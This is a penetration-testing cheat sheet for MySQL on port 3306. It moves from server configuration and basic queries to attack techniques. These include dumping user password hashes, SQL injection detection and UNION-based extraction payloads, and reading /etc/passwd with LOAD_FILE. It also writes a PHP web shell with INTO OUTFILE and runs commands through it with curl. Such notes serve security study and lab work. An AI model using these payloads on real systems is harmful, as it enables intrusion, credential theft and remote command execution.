+++
title = "🌐 MySQL: TCP 3306"
+++

`Database > Schema > Table > Column > Value`

- `TCP 3306`: normal
- Server Config:
    - `/etc/mysql/mysql.conf.d/mysqld.cnf`
- Default system schemas/databases:
    - `mysql` - contains info required by the MySQL server
    - `information_schema` - database metadata
    - `performance_schema` - monitoring feature
    - `sys` - a set of objects that helps interpret data
- Cheatsheet: https://devhints.io/mysql

{{% details "Dangerous Settings" %}}
- https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html

| **Settings**       | **Description**                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.                                                               |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
{{% /details %}}

```bash
mysql --user=<USER> --password=<PASSWORD> --skip-ssl --host=<TARGET> --port=<PORT>
```

```sql
-- Show Version
SELECT @@version ;
SELECT version() ;

-- Show User
SELECT USER() ;
SELECT CURRENT_USER() ;
SELECT database() ;
SELECT user, password FROM mysql.user ;

SHOW DATABASES ;
SHOW GRANTS ;

-- Show if user is privileged
SELECT user, super_priv FROM mysql.user ;
SELECT super_priv FROM mysql.user WHERE user="root" ;

-- Show user permissions
SELECT grantee, privilege_type FROM information_schema.user_privileges ;
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" ;
-- look for interesting perms like "FILE" to read/write files

-- Tables and metadata
SELECT host, unique_users FROM sys.host_summary ;

-- Write to database
USE <DATABASE> ;
SHOW tables ;
DESCRIBE <DATABASE>.<TABLE> ;

INSERT INTO <TABLE> VALUES (<COL1_VAL>, <COL2_VAL>, <COL3_VAL>, ...);

-- Insert mandatory values (and autogerante the others)
INSERT INTO <TABLE>(<COL2>, <COL4>) VALUES (<COL2_VAL>, <COL4_VAL>)

-- Get data
SELECT * FROM <TABLE> WHERE <COLUMN> = "<VALUE>" ;

SELECT * FROM <TABLE> WHERE <COLUMN> LIKE "%<VALUE>%" ORDER BY <COLUMN> LIMIT <NUM> ;

-- Example COUNT
SELECT COUNT(*) FROM <TABLE> WHERE <COLUMN1> > 10000 OR <COLUMN2> NOT LIKE '%<KEYWORD>%' ;
```

## Enumeration

### Check Injection

| Payload            | When to Use              | Expected Output                                     | Wrong Output                                              |
| ------------------ | ------------------------ | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | With full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | Only with numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output          | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |

### Read Values in Database

```sql
-- Get current database
SELECT database() ;

-- Show tables
SELECT table_name,table_schema FROM information_schema.tables where table_schema='<DATABASE>' ;

-- Get columns
select COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE>' ;

-- Read values
SELECT <COLUMN> FROM <DATABASE>.<TABLE> ;
```

#### Returning multiple values into one field

In some case, only 1 single field/column/etc. will be returned, and `GROUP_CONCAT()` can be used to return all results into 1 (web) field

```sql
GROUP_CONCAT(<COLUMN_NAME> SEPARATOR '; ')

-- This assumes 4 columns for the table
UNION SELECT 1,GROUP_CONCAT(<COLUMN>),3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE>'
```

### Read Files

- https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file

```sql
-- Read Files
SELECT LOAD_FILE("/etc/passwd") ;
```

### Write Files

- https://mariadb.com/docs/server/reference/sql-statements/data-manipulation/selecting-data/select-into-outfile#description
    1. User with `FILE` privilege
    2. MySQL global [`secure_file_priv` variable](https://mariadb.com/docs/server/server-management/variables-and-modes/server-system-variables#secure_file_priv) **not** enabled
         - `If not set, the default, or set to empty string, the statements will work with any files that can be accessed`
    3. Write access to the desired location (e.g. `/tmp/` or `/var/www/html/)

```sql
-- Check global variable
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv" ;

-- For 4 columns
SELECT "","<?php system($_REQUEST[cmd]); ?>","","" INTO OUTFILE '/var/www/html/webshell.php';
```

```bash
curl -o- 'http://<TARGET>/webshell.php?cmd=<COMMAND>'
```
